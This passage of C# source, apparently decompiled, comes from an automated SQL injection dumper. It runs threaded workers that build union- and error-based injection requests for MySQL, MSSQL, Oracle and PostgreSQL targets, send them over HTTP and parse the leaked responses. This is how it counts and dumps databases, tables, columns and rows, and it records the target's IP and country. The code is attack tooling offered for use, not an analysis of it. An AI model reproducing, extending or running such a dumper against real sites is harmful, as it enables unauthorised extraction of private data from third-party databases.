                        else if (this.__TypeGUI == enTypeGUI.Counter)
                        {
                            this.__AftectedRows = this.__SchemaDump.Item(0).Columns.Count;
                        }
                        else
                        {
                            bool flag2 = Conversions.ToBoolean(this.GetObjectValue(this.chkDumpWhere));
                            switch (this.__TypeGUI)
                            {
                                case enTypeGUI.DataBases:
                                    int.TryParse(Conversions.ToString(this.GetObjectValue(this.lblCountBDs)), out this.__AftectedRows);
                                    if (this.__AftectedRows <= 0 | flag2)
                                    {
                                        this.__Counter = enTypeCount.DBs;
                                        if (!flag2)
                                        {
                                            this.SetObjectValue(this.lblCountBDs, this.__AftectedRows.ToString());
                                        }
                                    }
                                    break;
                                case enTypeGUI.Tables:
                                    this.__AftectedRows = this.GetNodeCount(Schema.DATABASES, this.__SchemaDump.Item(0).DataBase, "", "");
                                    if (this.__AftectedRows <= 0 | flag2)
                                    {
                                        this.__Counter = enTypeCount.Tables;
                                        if (!flag2)
                                        {
                                            this.UpdateNodeCount(Schema.DATABASES, this.__SchemaDump.Item(0).DataBase, "", "", this.__AftectedRows.ToString(), "");
                                        }
                                    }
                                    break;
                                case enTypeGUI.Columns:
                                    this.__AftectedRows = this.GetNodeCount(Schema.TABLES, this.__SchemaDump.Item(0).DataBase, this.__SchemaDump.Item(0).Table, "");
                                    if (this.__AftectedRows <= 0 | flag2)
                                    {
                                        this.__Counter = enTypeCount.Columns;
                                        if (!flag2)
                                        {
                                            this.UpdateNodeCount(Schema.TABLES, this.__SchemaDump.Item(0).DataBase, this.__SchemaDump.Item(0).Table, "", this.__AftectedRows.ToString(), "");
                                        }
                                    }
                                    break;
                                case enTypeGUI.Data:
                                    this.__AftectedRows = this.GetNodeCount(Schema.ROWS, this.__SchemaDump.Item(0).DataBase, this.__SchemaDump.Item(0).Table, "");
                                    if (this.__AftectedRows <= 0 | flag2)
                                    {
                                        this.__Counter = enTypeCount.Rows;
                                        if (!flag2)
                                        {
                                            this.UpdateNodeCount(Schema.TABLES, this.__SchemaDump.Item(0).DataBase, this.__SchemaDump.Item(0).Table, "", "", this.__AftectedRows.ToString());
                                        }
                                    }
                                    break;
                                default:
                                    Interaction.MsgBox("FIX ME", MsgBoxStyle.OkOnly, null);
                                    return;
                            }
                            if (this.__Counter != enTypeCount.None)
                            {
                                Thread thread = new Thread(delegate(object a0)
                                {
                                    this.WorkerCounterThread((DumpThread)a0);
                                });
                                DumpThread dumpThread = new DumpThread(thread, 0, 0);
                                enTypeGUI _TypeGUI = this.__TypeGUI;
                                if (_TypeGUI != enTypeGUI.DataBases)
                                {
                                    dumpThread.DataBase = this.__SchemaDump.Item(0).DataBase;
                                    dumpThread.Table = this.__SchemaDump.Item(0).Table;
                                    dumpThread.Columns = this.__SchemaDump.Item(0).Columns;
                                }
                                thread.Start(dumpThread);
                                this.__ThreadPool.Open(thread);
                                while (!this.WorkedRequestStop() && this.__ThreadPool.ThreadCount != 0)
                                {
                                    Thread.Sleep(100);
                                }
                            }
                            if (num > 1)
                            {
                                this.__AftectedRows -= num;
                            }
                            if (this.WorkedRequestStop() | this.__AftectedRows <= 0)
                            {
                                goto IL_B62;
                            }
                        }
                    }
                    if (this.__AftectedRows > 1 && this.DumpWithVariousT())
                    {
                        this.__AftectedRows = (int)Math.Round(Math.Round((double)this.__AftectedRows / (double)this.__TrajectTotal, 0));
                    }
                    if (this.__AftectedRows <= 0)
                    {
                        Interaction.Beep();
                        if (string.IsNullOrEmpty(text))
                        {
                            e.Result = "Not detected afected rows";
                            return;
                        }
                        e.Result = text;
                        return;
                    }
                    else
                    {
                        if (num2 == 0)
                        {
                            this.SetObjectValue(this.numLimitMax, this.__AftectedRows);
                        }
                        int num3 = 0;
                        int num4 = 0;
                        if (flag | num2 == 1)
                        {
                            num3 = 1;
                            num4 = 1;
                        }
                        else
                        {
                            num3 = this.__AftectedRows;
                            /* if (Conversions.ToBoolean((!Conversions.ToBoolean(Operators.ConditionalCompareObjectGreater(this.__AftectedRows, this.GetObjectValue(this.tkbThreads), false)) || !Conversions.ToBoolean(this.GetObjectValue(this.chkThreads))) ? false : true))
                             {
                                 num4 = Conversions.ToInteger(this.GetObjectValue(this.tkbThreads));
                             }
                             else if (Conversions.ToBoolean(this.GetObjectValue(this.chkThreads)))
                             {
                                 num4 = this.__AftectedRows;
                             }
                             else
                             {
                                 num4 = 1;
                             }*/
                        }
                        if (Utls.TypeIsOracle(this.__SQLType) & this.__TypeGUI == enTypeGUI.DataBases)
                        {
                            num4 = 1;
                        }
                        if (num3 > 1 & this.__AftectedRows != 1000000)
                        {
                            //this.__Loading.SetLoadingType(ProgressBarStyle.Blocks);
                        }
                        else
                        {
                           // this.__Loading.SetLoadingType(ProgressBarStyle.Marquee);
                        }
                        this.__WorkerResult.AffectedRows = this.__AftectedRows;
                        this.__ThreadPool = new global::ThreadPool(num4);
                        Dictionary<int, int> dictionary = new Dictionary<int, int>();
                        while (true)
                        {
                        IL_B55:
                            int arg_B5B_0 = 0;
                            int num5 = num3 - 1;
                            int i = arg_B5B_0;
                            while (i <= num5)
                            {
                                num2 = Conversions.ToInteger(this.GetObjectValue(this.numLimitMax));
                                if (num2 <= 0 || i < num2)
                                {
                                    if (!this.WorkedRequestStop())
                                    {
                                        if (!this.WorkedRequestRetryExceeded(0))
                                        {
                                            if (dictionary.Count == 0)
                                            {
                                                if (!flag & this.__AftectedRows != 1000000)
                                                {
                                                    int percentProgress = (int)Math.Round(Math.Round((double)(100 * (i + 1)) / (double)num3));
                                                    this.bckWorker.ReportProgress(percentProgress, "");
                                                    this.UpDateStatus(string.Concat(new string[]
												{
													"[",
													Strings.FormatNumber(i + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
													"/",
													Strings.FormatNumber(num3, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
													"] Dumper thread, loading please wait.."
												}));
                                                }
                                                else
                                                {
                                                    this.bckWorker.ReportProgress(-1, "");
                                                    this.UpDateStatus("[" + Strings.FormatNumber(i + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + "] Dumper thread, loading please wait..");
                                                }
                                            }
                                            else
                                            {
                                               // this.__Loading.SetLoadingType(ProgressBarStyle.Marquee);
                                                this.bckWorker.ReportProgress(-1, "");
                                                this.UpDateStatus(string.Concat(new string[]
											{
												"[",
												Strings.FormatNumber(i + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
												"/",
												Strings.FormatNumber(dictionary.Count, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
												"] Dumper thread, loading please wait.. Dumping failed row index."
											}));
                                            }
                                            Thread thread;
                                            if (this.__TypeGUI == enTypeGUI.Data | this.__TypeGUI == enTypeGUI.CustomData)
                                            {
                                                thread = new Thread(delegate(object a0)
                                                {
                                                    this.WorkerDumperThread((DumpThread)a0);
                                                });
                                            }
                                            else if (this.__TypeGUI == enTypeGUI.Info)
                                            {
                                                thread = new Thread(delegate(object a0)
                                                {
                                                    this.WorkerGetInfoThread((DumpThread)a0);
                                                });
                                            }
                                            else if (this.__TypeGUI == enTypeGUI.Counter)
                                            {
                                                thread = new Thread(delegate(object a0)
                                                {
                                                    this.WorkerCounterThread((DumpThread)a0);
                                                });
                                            }
                                            else
                                            {
                                                thread = new Thread(delegate(object a0)
                                                {
                                                    this.WorkerSchemaThread((DumpThread)a0);
                                                });
                                            }
                                            thread.Name = "Pos : " + i.ToString();
                                            if (flag & !(this.__TypeGUI == enTypeGUI.Data | this.__TypeGUI == enTypeGUI.CustomData))
                                            {
                                                num = -1;
                                                y = 1;
                                            }
                                            DumpThread dumpThread2;
                                            if (dictionary.Count == 0)
                                            {
                                                dumpThread2 = new DumpThread(thread, num, y);
                                                dumpThread2.IndexJob = i;
                                            }
                                            else
                                            {
                                                num = dictionary[i];
                                                dumpThread2 = new DumpThread(thread, num, y);
                                                dumpThread2.IndexJob = num;
                                            }
                                            dumpThread2.TotalThreads = num4;
                                            dumpThread2.TotalJob = num3;
                                            dumpThread2.AfectedRows = this.__AftectedRows;
                                            if (this.__TypeGUI != enTypeGUI.Info & this.__TypeGUI != enTypeGUI.DataBases)
                                            {
                                                dumpThread2.DataBase = this.__SchemaDump.Item(0).DataBase;
                                                dumpThread2.Table = this.__SchemaDump.Item(0).Table;
                                                dumpThread2.Columns = this.__SchemaDump.Item(0).Columns;
                                            }
                                            thread.Start(dumpThread2);
                                            this.__ThreadPool.Open(thread);
                                            this.__ThreadPool.WaitForThreads();
                                            num++;
                                            Thread.Sleep(100);
                                            i++;
                                            continue;
                                        }
                                        e.Result = "retry limit exceeded";
                                    }
                                    else
                                    {
                                        e.Result = "canceled by user";
                                    }
                                }
                                else
                                {
                                    e.Result = "Limit Maximum Exceeded";
                                }
                            IL_9E1:
                                if (this.__ThreadPool.Status == global::ThreadPool.ThreadStatus.Stopped)
                                {
                                    goto IL_B62;
                                }
                                while (true)
                                {
                                    this.bckWorker.ReportProgress(-1, "");
                                    if (num4 > 1)
                                    {
                                        if (dictionary.Count == 0)
                                        {
                                            this.UpDateStatus("finishing threads.. (" + Conversions.ToString(this.__ThreadPool.ThreadCount) + ")");
                                        }
                                        else
                                        {
                                            this.UpDateStatus("finishing threads [failed rows index].. (" + Conversions.ToString(this.__ThreadPool.ThreadCount) + ")");
                                        }
                                    }
                                    if (this.WorkedRequestStop() || this.__ThreadPool.ThreadCount == 0)
                                    {
                                        break;
                                    }
                                    Thread.Sleep(100);
                                }
                                if (!this.WorkedRequestStop() && Conversions.ToBoolean(this.GetObjectValue(this.chkReDumpFailed)) && (this.__TypeGUI != enTypeGUI.CustomData & this.__TypeGUI != enTypeGUI.Info) && this.__AftectedRows != 1000000 && this.__WorkerResult.IndexFailed.Count > 0)
                                {
                                    dictionary.Clear();
                                    int arg_B06_0 = 0;
                                    int num6 = this.__WorkerResult.IndexFailed.Count - 1;
                                    for (int j = arg_B06_0; j <= num6; j++)
                                    {
                                        dictionary.Add(j, this.__WorkerResult.IndexFailed[j]);
                                    }
                                    this.__WorkerResult.IndexFailed.Clear();
                                    this.__WorkerResult.RetryLimit = 0;
                                    num3 = dictionary.Count;
                                    goto IL_B55;
                                }
                                goto IL_B62;
                            }
                            //goto IL_9E1;
                        }
                    }
                IL_B62:
                    if (this.__ThreadPool != null)
                    {
                        this.__ThreadPool.AllJobsPushed();
                    }
                /*}
                catch (Exception expr_B77)
                {
                    ProjectData.SetProjectError(expr_B77);
                    Exception ex = expr_B77;
                    if (!this.WorkedRequestStop())
                    {
                        text = "Error: " + ex.Message;
                    }
                    ProjectData.ClearProjectError();
                }
                finally
                {*/
                    if (string.IsNullOrEmpty(Conversions.ToString(e.Result)) && !string.IsNullOrEmpty(text))
                    {
                        e.Result = text;
                    }
                    if (this.bckWorker.CancellationPending)
                    {
                        e.Result = "worker canceled";
                    }
                //}
            }
        }
        private void bckWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            int num2 = 0;
            bool Label_0062_go = false;
        Label_0062:
            try
            {
                bool flag = false;
                int num3 = 0;
            Label_0000:
                ProjectData.ClearProjectError();
                int num = 1;
            Label_0007:
                num3 = 2;
                //Globals.UpDateLoading(ref this.__Loading, e.ProgressPercentage, ref flag, "");
                Console.WriteLine(e.ProgressPercentage + " %");
            Label_0021:
                num3 = 3;
                if (!(flag | !Globals.NETWORK_AVAILABLE))
                {
                    goto Label_009F;
                }
            Label_002F:
                num3 = 4;
            this.bckWorker.CancelAsync();
                goto Label_009F;
            Label_003E:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0000;

                    case 2:
                        goto Label_0007;

                    case 3:
                        goto Label_0021;

                    case 4:
                        goto Label_002F;

                    case 5:
                        goto Label_009F;

                    default:
                        goto Label_0094;
                }
                if (Label_0062_go)
                {
                    num2 = num3;
                    switch (num)
                    {
                        case 0:
                            goto Label_0094;

                        case 1:
                            goto Label_003E;
                    }
                }
            }
            catch (Exception exception1) //when (?)
            {
                ProjectData.SetProjectError(exception1);
                Label_0062_go = true;
                goto Label_0062;
            }
        Label_0094:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_009F:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }
        private void bckWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            this.__ThreadPool = null;
            //global::Globals.LockWindowUpdate(this.Handle);
            if (Information.IsNothing(RuntimeHelpers.GetObjectValue(e.Result)))
            {
                this.StopedWorker("worker complete");
            }
            else if (this.__WorkerResult.AffectedRows == 1000000)
            {
                this.StopedWorker("worker complete");
            }
            else
            {
                this.StopedWorker(e.Result.ToString());
            }
            //global::Globals.LockWindowUpdate(IntPtr.Zero);
        }

        private void GridAddRow(List<string> lRow)
        {
        }
        private void GridUpdateRow(int index, string value)
        {
        }

        private void GridAddNew(int iTColumns = 0)
        {
            checked
            {
                /*if (this.__DumpGridAdded)
                {
                    return;
                }
                this.__DumpGridAdded = true;
                if (!Utls.TypeIsMySQL(this.__SQLType) && this.__TypeGUI == enTypeGUI.CustomData)
                {
                    List<string> list = new List<string>();
                    int arg_73_0 = 0;
                    int num = iTColumns - 1;
                    for (int i = arg_73_0; i <= num; i++)
                    {
                        list.Add("Column " + Conversions.ToString(i + 1));
                    }
                    this.__CurrDumpGrid.DataBase = "Custom";
                    this.__CurrDumpGrid.Table = "Query";
                    this.__CurrDumpGrid.Columns = list;
                    this.__CurrDumpGrid.Text = this.__SchemaDump.Item(0).DataBase + "." + this.__SchemaDump.Item(0).Table;
                }
                else
                {
                    this.__CurrDumpGrid.DataBase = this.__SchemaDump.Item(0).DataBase;
                    this.__CurrDumpGrid.Table = this.__SchemaDump.Item(0).Table;
                    this.__CurrDumpGrid.Columns = this.__SchemaDump.Item(0).Columns;
                    this.__CurrDumpGrid.Text = this.__SchemaDump.Item(0).DataBase + "." + this.__SchemaDump.Item(0).Table;
                }
                this.__CurrDumpGrid.BuildColumns();
                this.__CurrDumpGrid.btnFullView.Click += new EventHandler(this.btnFullView_Click);
                this.__CurrDumpGrid.btnCloseAllGrids.Click += new EventHandler(this.btnCloseAllGrids_Click);
                this.__CurrDumpGrid.btnCloseAllButThis.Click += new EventHandler(this.btnCloseAllButThis_Click);
                this.__CurrDumpGrid.btnCloseGrid.Click += new EventHandler(this.btnCloseGrid_Click);
                this.__CurrDumpGrid.Tag = this.tabData.TabPages.Add(this.__CurrDumpGrid);
                NewLateBinding.LateSetComplex(this.__CurrDumpGrid.Tag, null, "CloseButtonVisible", new object[]
			    {
				    false
			    }, null, null, false, true);
                    this.__CurrDumpGrid.Show();
                    this.tabData.SelectItem((global::TabPage)this.__CurrDumpGrid.Tag);
                    this.__DumpGrids.Add(this.__CurrDumpGrid);*/
            }
        }

        private int GetNodeCount(Schema oT, string sDB, string sTable = "", string sCollumn = "")
        {
            bool flag = false;
            if (flag = (oT == Schema.ROWS))
            {
                oT = Schema.TABLES;
            }
            TreeNode node = this.GetNode(oT, sDB, sTable, sCollumn);
            if (node == null)
            {
                return -1;
            }
            return this.NodeGetCount(node.Text, !flag);
        }

        private void AddNode(TreeNode o, string sValue, int picIndex)
        {
            bool flag = false;
            try
            {
                IEnumerator enumerator = o.Nodes.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    TreeNode treeNode = (TreeNode)enumerator.Current;
                    if (this.NodeRemoveCount(treeNode.Text).Equals(this.NodeRemoveCount(sValue)))
                    {
                        flag = true;
                    }
                }
            }
            finally
            {
            }
            if (!flag)
            {
                o.Nodes.Add(sValue, sValue, picIndex).SelectedImageIndex = picIndex;
            }
        }

        private List<string> SQLDump(Schema oSchema, string sDataBase, string sTable, List<string> lColumns, int limitX, int limitY, string sWhere, string sOrder, ref string sResult, ref HttpResponse oResp, DumpThread t = null, int iMSQLErrCIndex = -1)
        {
            List<string> list = new List<string>();
            checked
            {
                /*try
                {*/
                    bool flag = Conversions.ToBoolean(this.GetObjectValue(this.chkDumpEncodedHex));
                    int num = Conversions.ToInteger(this.GetObjectValue(this.numMaxRetry));
                    Conversions.ToInteger(this.GetObjectValue(this.numSleep));
                    switch (this.__SQLType)
                    {
                        case Types.MySQL_No_Error:
                        case Types.MySQL_With_Error:
                            switch (oSchema)
                            {
                                case Schema.INFO:
                                case Schema.ROWS:
                                    flag = Conversions.ToBoolean(this.GetObjectValue(this.chkDumpEncodedHex));
                                    break;
                            }
                            break;
                    }
                    string text = this.BuildTraject(oSchema, sDataBase, sTable, lColumns, limitX, limitY, sWhere, sOrder, ref sResult, t, iMSQLErrCIndex);
                    while (!this.WorkedRequestStop())
                    {
                        if (this.WorkedRequestRetryExceeded(0))
                        {
                            sResult = "retry limit exceeded";
                            return list;
                        }
                        string text2 = this.LoadHTML(ref text, ref sResult, ref oResp);
                        if (string.IsNullOrEmpty(text2))
                        {
                            if (string.IsNullOrEmpty(sResult))
                            {
                                sResult = "HTTP Timeout (Row Index: " + Conversions.ToString(limitX) + ")";
                            }
                            if (Conversions.ToBoolean((!Conversions.ToBoolean(this.__TypeGUI == enTypeGUI.Data) || !Conversions.ToBoolean(this.GetObjectValue(this.chkDumpFieldByField))) ? false : true))
                            {
                                return list;
                            }
                            int num2 = 0;
                            if (num2 >= num)
                            {
                                return list;
                            }
                            num2++;
                        }
                        else
                        {
                            List<string> list2 = this.ParseHtmlData(text2, false);
                            if (list2.Count != 0)
                            {
                                try
                                {
                                    List<string>.Enumerator enumerator = list2.GetEnumerator();
                                    while (enumerator.MoveNext())
                                    {
                                        string text3 = enumerator.Current;
                                        if (flag & !Versioned.IsNumeric(text3))
                                        {
                                            text3 = Globals.G_Utilities.ConvertHexToText(text3);
                                        }
                                        list.Add(text3);
                                    }
                                }
                                finally
                                {
                                }
                                sResult = "Data loaded successfully (Count: " + Conversions.ToString(list2.Count) + ")";
                                return list;
                            }
                            sResult = "Data not found (Index: " + Conversions.ToString(limitX) + ")";
                            return list;
                        }
                    }
                    sResult = "canceled by user";
                /*}
                catch (Exception expr_208)
                {
                    ProjectData.SetProjectError(expr_208);
                    Exception ex = expr_208;
                    sResult = "Row Index: " + Conversions.ToString(limitX) + " Error: " + ex.ToString();
                    ProjectData.ClearProjectError();
                }
                finally
                {
                }*/
                return list;
            }
        }

        private int SQLCount(Schema o, string sDataBase, string sTable, ref string sResult)
        {
            int result = -1;
            string sWhere = "";
            string sTraject = "[t]";
            if (this.__TypeGUI != enTypeGUI.Info & this.__TypeGUI != enTypeGUI.CustomData)
            {
                sWhere = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.GetObjectValue(this.chkDumpWhere)), RuntimeHelpers.GetObjectValue(this.GetObjectValue(this.txtSchemaWhere)), ""));
                this.QueryFixLines(ref sWhere);
            }
            checked
            {
                try
                {
                    if (this.__SQLType == Types.MySQL_No_Error)
                    {
                        if (this.__TypeGUI != enTypeGUI.CustomData)
                        {
                            sTraject = MySQLNoError.Count(sTraject, this.GetMySQLCollaction(), o, sDataBase, sTable, sWhere, "");
                        }
                        else
                        {
                            List<string> list = new List<string>();
                            list.Add("count(0)");
                            string query = this.__SchemaDump.Item(0).Query;
                            sTraject = MySQLNoError.Dump(sTraject, this.GetMySQLCollaction(), false, false, "", "", list, 0, 1, "", "", "", query);
                        }
                    }
                    else if (this.__SQLType == Types.MySQL_With_Error)
                    {
                        bool flag = true;
                        MySQLErrorType oType = new MySQLErrorType();
                        if (Operators.ConditionalCompareObjectEqual(true, this.GetObjectValue(this.rdbMySQLErrorType1), false))
                        {
                            oType = MySQLErrorType.DuplicateEntry;
                        }
                        else if (Operators.ConditionalCompareObjectEqual(flag, this.GetObjectValue(this.rdbMySQLErrorType2), false))
                        {
                            oType = MySQLErrorType.ExtractValue;
                        }
                        else if (Operators.ConditionalCompareObjectEqual(flag, this.GetObjectValue(this.rdbMySQLErrorType3), false))
                        {
                            oType = MySQLErrorType.UpdateXML;
                        }
                        if (this.__TypeGUI != enTypeGUI.CustomData)
                        {
                            sTraject = MySQLWithError.Count(sTraject, this.GetMySQLCollaction(), oType, o, sDataBase, sTable, sWhere, "");
                        }
                        else
                        {
                            List<string> list2 = new List<string>();
                            list2.Add("count(0)");
                            string query2 = this.__SchemaDump.Item(0).Query;
                            sTraject = MySQLWithError.Dump(sTraject, this.GetMySQLCollaction(), oType, false, "", "", list2, 0, 1, "", "", "", query2);
                        }
                    }
                    else if (this.__SQLType == Types.MSSQL_No_Error | this.__SQLType == Types.MSSQL_With_Error)
                    {
                        InjectionType oError = new InjectionType();
                        switch (this.__SQLType)
                        {
                            case Types.MSSQL_No_Error:
                                oError = InjectionType.Union;
                                break;
                            case Types.MSSQL_With_Error:
                                oError = InjectionType.Error;
                                break;
                        }
                        bool bCollateLatin = Conversions.ToBoolean(this.GetObjectValue(this.chkMSSQL_Latin1));
                        bool value = Conversions.ToBoolean(this.GetObjectValue(this.chkMSSQLCastAsChar));
                        if (this.__TypeGUI == enTypeGUI.CustomData)
                        {
                            int result2 = 1000000;
                            return result2;
                        }
                        sTraject = MSSQL.Count(sTraject, oError, Conversions.ToString(value), bCollateLatin, o, sDataBase, sTable, sWhere, "");
                    }
                    else if (this.__SQLType == Types.Oracle_No_Error | this.__SQLType == Types.Oracle_With_Error)
                    {
                        bool bCastAsChar = Conversions.ToBoolean(this.GetObjectValue(this.chkOracleCastAsChar));
                        InjectionType oMethod = new InjectionType();
                        switch (this.__SQLType)
                        {
                            case Types.Oracle_No_Error:
                                oMethod = InjectionType.Union;
                                break;
                            case Types.Oracle_With_Error:
                                oMethod = InjectionType.Error;
                                break;
                        }
                        bool flag2 = true;
                        OracleErrorType bError = new OracleErrorType();
                        if (true == (this.__SQLType == Types.Oracle_No_Error))
                        {
                            bError = OracleErrorType.NONE;
                        }
                        else if (Operators.ConditionalCompareObjectEqual(flag2, this.GetObjectValue(this.rdbOracleErrorType1), false))
                        {
                            bError = OracleErrorType.GET_HOST_ADDRESS;
                        }
                        else if (Operators.ConditionalCompareObjectEqual(flag2, this.GetObjectValue(this.rdbOracleErrorType2), false))
                        {
                            bError = OracleErrorType.DRITHSX_SN;
                        }
                        else if (Operators.ConditionalCompareObjectEqual(flag2, this.GetObjectValue(this.rdbOracleErrorType3), false))
                        {
                            bError = OracleErrorType.GETMAPPINGXPATH;
                        }
                        if (this.__TypeGUI == enTypeGUI.CustomData)
                        {
                            int result2 = 1000000;
                            return result2;
                        }
                        sTraject = Oracle.Count(sTraject, oMethod, bError, bCastAsChar, o, sDataBase, sTable, sWhere, "");
                    }
                    else
                    {
                        if (!(this.__SQLType == Types.PostgreSQL_No_Error | this.__SQLType == Types.PostgreSQL_With_Error))
                        {
                            Interaction.MsgBox("FIX ME ", MsgBoxStyle.OkOnly, null);
                            int result2 = -1;
                            return result2;
                        }
                        PostgreSQLErrorType bError2 = new PostgreSQLErrorType();
                        InjectionType oMethod2 = new InjectionType();
                        switch (this.__SQLType)
                        {
                            case Types.PostgreSQL_No_Error:
                                bError2 = PostgreSQLErrorType.NONE;
                                oMethod2 = InjectionType.Union;
                                break;
                            case Types.PostgreSQL_With_Error:
                                bError2 = PostgreSQLErrorType.CAST_INT;
                                oMethod2 = InjectionType.Error;
                                break;
                        }
                        if (this.__TypeGUI == enTypeGUI.CustomData)
                        {
                            int result2 = 1000000;
                            return result2;
                        }
                        sTraject = PostgreSQL.Count(sTraject, oMethod2, bError2, o, sDataBase, sTable, sWhere, "");
                    }
                    int num = Conversions.ToInteger(this.GetObjectValue(this.numMaxRetry));
                    Conversions.ToInteger(this.GetObjectValue(this.numSleep));
                    while (!this.WorkedRequestStop())
                    {
                        HttpResponse httpResponse = null;
                        string text = this.LoadHTML(ref sTraject, ref sResult, ref httpResponse);
                        if (string.IsNullOrEmpty(text))
                        {
                            int num2 = 0;
                            if (num2 >= num)
                            {
                                sResult = "HTTP Timeout";
                                break;
                            }
                            num2++;
                        }
                        else
                        {
                            List<string> list3 = this.ParseHtmlData(text, false);
                            if (list3.Count > 0)
                            {
                                try
                                {
                                    List<string>.Enumerator enumerator = list3.GetEnumerator();
                                    while (enumerator.MoveNext())
                                    {
                                        int num3 = Conversions.ToInteger(enumerator.Current);
                                        if (Versioned.IsNumeric(num3))
                                        {
                                            result = num3;
                                            break;
                                        }
                                    }
                                }
                                finally
                                {
                                }
                                break;
                            }
                            break;
                        }
                    }
                }
                catch (Exception expr_491)
                {
                    ProjectData.SetProjectError(expr_491);
                    Exception ex = expr_491;
                    sResult = "Error: " + ex.Message;
                    ProjectData.ClearProjectError();
                }
                finally
                {
                }
                return result;
            }
        }

        private void SortTreeView(TreeView o)
        {
            this.SortTreeNodes(o.Nodes);
            try
            {
                IEnumerator enumerator = o.Nodes.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    TreeNode treeNode = (TreeNode)enumerator.Current;
                    this.SortTreeNodes(treeNode.Nodes);
                    try
                    {
                        IEnumerator enumerator2 = treeNode.Nodes.GetEnumerator();
                        while (enumerator2.MoveNext())
                        {
                            TreeNode treeNode2 = (TreeNode)enumerator2.Current;
                            this.SortTreeNodes(treeNode2.Nodes);
                            try
                            {
                                IEnumerator enumerator3 = treeNode2.Nodes.GetEnumerator();
                                while (enumerator3.MoveNext())
                                {
                                    TreeNode treeNode3 = (TreeNode)enumerator3.Current;
                                    this.SortTreeNodes(treeNode3.Nodes);
                                }
                            }
                            finally
                            {
                                
                            }
                        }
                    }
                    finally
                    {
                        
                    }
                }
            }
            finally
            {
               
            }
        }
        public struct TVITEM
        {
            public int mask;

            public IntPtr hItem;

            public int state;

            public int stateMask;

            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpszText;

            public int cchTextMax;

            public int iImage;

            public int iSelectedImage;

            public int cChildren;

            public IntPtr lParam;
        }

        public class TreeNodeComparer : IComparer<TreeNode>
        {
            public int Compare(TreeNode x, TreeNode y)
            {
                if (x == null)
                {
                    if (y == null)
                    {
                        return 0;
                    }
                    return -1;
                }
                else
                {
                    if (y == null)
                    {
                        return 1;
                    }
                    return string.CompareOrdinal(x.Text, y.Text);
                }
            }
        }
        private void SortTreeNodes(TreeNodeCollection children)
        {
            TreeNode[] array = new TreeNode[checked(children.Count - 1 + 1)];
            children.CopyTo(array, 0);
            Array.Sort<TreeNode>(array, new TreeNodeComparer());
            children.Clear();
            children.AddRange(array);
        }

        internal void SetInfo(string sUser, string sWebServer, string sVersion, string sDataBase, string sIP, string sCountry, bool bIniTree = false)
        {
            
            this.lblUser = sUser;
            this.lblServer = sWebServer;
            this.lblVersion = sVersion;
            this.lblDatabase = sDataBase;
            this.lblIP = sIP;
            this.lblCountry = sCountry;
            this.__CurrentDataBase = sDataBase;
            if (!string.IsNullOrEmpty(sDataBase))
            {
                if (!sDataBase.Equals("DataBase"))
                {
                    this.AddDataBase(sDataBase);
                }
                try
                {
                    IEnumerator enumerator = this.trwSchema.Nodes.GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        TreeNode treeNode = (TreeNode)enumerator.Current;
                        if (this.NodeRemoveCount(treeNode.Text).Equals(this.__CurrentDataBase))
                        {
                            //Font nodeFont = new Font(this.trwSchema.Font, FontStyle.Bold | FontStyle.Italic);
                            //treeNode.NodeFont = nodeFont;
                            //treeNode.EnsureVisible();
                        }
                    }
                }
                finally
                {
                }
            }
            if (bIniTree)
            {
                this.IniTree();
            }
        }

        private bool RightSchemaName(string sText)
        {
            char[] array = sText.ToCharArray();
            checked
            {
                for (int i = 0; i < array.Length; i++)
                {
                    char c = array[i];
                    if (!"abcdefghijklmnopqrstuvwxyz0123456789_-".Contains(c.ToString().ToLower()))
                    {
                        return false;
                    }
                }
                return true;
            }
        }
        internal bool RemSchema(string sName)
        {
            bool result = false;
            /*try
            {
                if (File.Exists(Globals.DUMP_SCHEMA_PATH + sName))
                {
                    File.Delete(Globals.DUMP_SCHEMA_PATH + sName);
                    this.UpDateStatus("Dumper thread, scheme sucefully deleted.. (" + sName + ")");
                    result = true;
                }
            }
            catch (Exception expr_3E)
            {
                ProjectData.SetProjectError(expr_3E);
                Exception ex = expr_3E;
                this.UpDateStatus(ex.ToString());
                ProjectData.ClearProjectError();
            }*/
            return result;
        }
        private void QueryFixLines(ref string sQuery)
        {
            if (string.IsNullOrEmpty(sQuery))
            {
                return;
            }
            sQuery = sQuery.Replace("\r\n\r\n", "\r\n");
            sQuery = sQuery.Replace("\r\n", " ");
            sQuery = sQuery.Replace("\t", " ");
            sQuery = sQuery.Replace("  ", " ");
            if (!Utls.TypeIsOracle(this.__SQLType))
            {
                sQuery = sQuery.Replace(" ,", "");
            }
            sQuery = sQuery.Trim();
        }
        private string NodeUpdateCount(string sText, string sCount1, string sCount2 = "")
        {
            sText = this.NodeRemoveCount(sText);
            return this.NodeFormatCount(sText, sCount1, sCount2);
        }
        private string NodeRemoveCount(string sText)
        {
            if (string.IsNullOrEmpty(sText))
            {
                return "";
            }
            int num = sText.IndexOf("[");
            if (num > 0)
            {
                sText = sText.Substring(0, num).Trim();
            }
            return sText;
        }
        private int NodeGetCount(string sText, bool bFirtCount)
        {
            int result = -1;
            if (string.IsNullOrEmpty(sText))
            {
                return -1;
            }
            int num = sText.IndexOf("[");
            sText = sText.Replace("]", "");
            if (num > 0)
            {
                sText = sText.Substring(checked(num + 1)).Trim();
                if (bFirtCount)
                {
                    sText = Strings.Split(sText, "#", -1, CompareMethod.Binary)[0].Trim();
                    if (Versioned.IsNumeric(sText))
                    {
                        result = Conversions.ToInteger(sText);
                    }
                }
                else if (sText.IndexOf('#') > 0)
                {
                    sText = Strings.Split(sText, "#", -1, CompareMethod.Binary)[1].Trim();
                    if (Versioned.IsNumeric(sText))
                    {
                        result = Conversions.ToInteger(sText);
                    }
                }
            }
            return result;
        }
        private string NodeFormatCount(string sText, string sCount1, string sCount2 = "")
        {
